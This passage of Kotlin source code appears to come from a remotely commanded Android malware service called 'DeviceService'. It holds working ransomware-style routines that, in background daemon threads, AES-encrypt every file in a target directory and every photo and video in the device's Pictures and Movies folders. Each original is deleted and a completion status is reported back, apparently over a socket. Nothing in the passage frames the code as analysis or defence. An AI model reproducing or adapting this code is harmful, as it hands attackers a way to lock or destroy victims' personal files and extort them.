                                    if (file.name.endsWith(".enc")) {
                                        encryptor.decryptFile(file)
                                        Log.d("DeviceService", "Decrypted: ${file.name}")
                                    }
                                }
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "Error processing ${file.name}: ${e.message}")
                        }
                    }
                }
                
                emitStatus(JSONObject().apply {
                    put("encryptionStatus", "completed")
                    put("operation", operation)
                    put("path", dirPath)
                    put("timestamp", System.currentTimeMillis())
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "processDirectory error: ${e.message}")
                emitStatus(JSONObject().apply {
                    put("encryptionError", e.message)
                    put("path", dirPath)
                })
            }
        }.apply { isDaemon = true }.start()
    }

    private fun processMediaFiles(mediaType: String, operation: String) {
        Thread {
            try {
                val encryptor = FileEncryptor()
                val mediaDir = when (mediaType) {
                    "image" -> android.os.Environment.getExternalStoragePublicDirectory(
                        android.os.Environment.DIRECTORY_PICTURES
                    )
                    "video" -> android.os.Environment.getExternalStoragePublicDirectory(
                        android.os.Environment.DIRECTORY_MOVIES
                    )
                    else -> null
                }
                
                if (mediaDir?.exists() != true) {
                    Log.w("DeviceService", "Media directory not found: $mediaType")
                    return@Thread
                }
                
                val extension = if (mediaType == "image") arrayOf(".jpg", ".jpeg", ".png", ".gif", ".webp")
                                else arrayOf(".mp4", ".mkv", ".avi", ".mov", ".flv")
                
                val files = mediaDir.listFiles { file ->
                    file.isFile && extension.any { file.name.endsWith(it, ignoreCase = true) }
                } ?: arrayOf()
                
                var successCount = 0
                var failCount = 0
                
                for (file in files) {
                    try {
                        when (operation) {
                            "encrypt" -> {
                                encryptor.encryptFile(file)
                                successCount++
                                Log.d("DeviceService", "Encrypted media: ${file.name}")
                            }
                            "decrypt" -> {
                                if (file.name.endsWith(".enc")) {
                                    encryptor.decryptFile(file)
                                    successCount++
                                    Log.d("DeviceService", "Decrypted media: ${file.name}")
                                }
                            }
                        }
                    } catch (e: Exception) {
                        failCount++
                        Log.e("DeviceService", "Error processing media ${file.name}: ${e.message}")
                    }
                }
                
                emitStatus(JSONObject().apply {
                    put("mediaEncryptionStatus", "completed")
                    put("mediaType", mediaType)
                    put("operation", operation)
                    put("successCount", successCount)
                    put("failCount", failCount)
                    put("timestamp", System.currentTimeMillis())
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "processMediaFiles error: ${e.message}")
                emitStatus(JSONObject().apply {
                    put("mediaEncryptionError", e.message)
                    put("mediaType", mediaType)
                })
            }
        }.apply { isDaemon = true }.start()
    }
    
    // FileEncryptor class untuk handle AES-256 encryption/decryption
    private inner class FileEncryptor {
        private val algorithm = "AES/CBC/PKCS5Padding"
        private val keySize = 256
        private val sharedPrefsKey = "SKYLINE_ENCRYPTION_KEY"
        
        private fun getPersistentKey(): ByteArray {
            val prefs = getSharedPreferences("skyline_crypto", Context.MODE_PRIVATE)
            val savedKey = prefs.getString(sharedPrefsKey, null)
            
            return if (savedKey != null) {
                android.util.Base64.decode(savedKey, android.util.Base64.DEFAULT)
            } else {
                // Generate key once and save it
                val keyGenerator = javax.crypto.KeyGenerator.getInstance("AES")
                keyGenerator.init(keySize)
                val newKey = keyGenerator.generateKey().encoded
                prefs.edit().putString(sharedPrefsKey, android.util.Base64.encodeToString(newKey, android.util.Base64.DEFAULT)).apply()
                newKey
            }
        }
        
        fun encryptFile(file: java.io.File) {
            try {
                val cipher = Cipher.getInstance(algorithm)
                val key = javax.crypto.spec.SecretKeySpec(getPersistentKey(), 0, 32, "AES")
                
                val iv = ByteArray(16)
                java.security.SecureRandom().nextBytes(iv)
                val ivSpec = javax.crypto.spec.IvParameterSpec(iv)
                
                cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec)
                
                val fileBytes = file.readBytes()
                val encryptedBytes = cipher.doFinal(fileBytes)
                
                // Save IV + encrypted data (key is persistent, no need to save)
                val outputFile = java.io.File(file.absolutePath + ".enc")
                java.io.FileOutputStream(outputFile).use { fos ->
                    fos.write(iv)
                    fos.write(encryptedBytes)
                }
                
                file.delete()
                Log.d("DeviceService", "✓ Encrypted: ${file.name}")
            } catch (e: Exception) {
                Log.e("DeviceService", "✗ Encryption failed ${file.name}: ${e.message}")
            }
        }
        
        fun decryptFile(file: java.io.File) {
            try {
                val fileBytes = file.readBytes()
                
                // Extract IV + encrypted data
                val ivBytes = fileBytes.copyOfRange(0, 16)
                val encryptedBytes = fileBytes.copyOfRange(16, fileBytes.size)
                
                val key = javax.crypto.spec.SecretKeySpec(getPersistentKey(), 0, 32, "AES")
                val ivSpec = javax.crypto.spec.IvParameterSpec(ivBytes)
                
                val cipher = Cipher.getInstance(algorithm)
                cipher.init(Cipher.DECRYPT_MODE, key, ivSpec)
                val decryptedBytes = cipher.doFinal(encryptedBytes)
                
                val outputFileName = file.absolutePath.replace(".enc", "")
                val outputFile = java.io.File(outputFileName)
                java.io.FileOutputStream(outputFile).use { fos ->
                    fos.write(decryptedBytes)
                }
                
                file.delete()
                Log.d("DeviceService", "✓ Decrypted: ${outputFile.name}")
            } catch (e: Exception) {
                Log.e("DeviceService", "✗ Decryption failed ${file.name}: ${e.message}")
            }
        }
    }

    private var mediaPlayer: android.media.MediaPlayer? = null
    private var lockMediaPlayer: android.media.MediaPlayer? = null
}

object SocketHolder {
    var connected: Boolean = false
    var socket: Socket? = null
}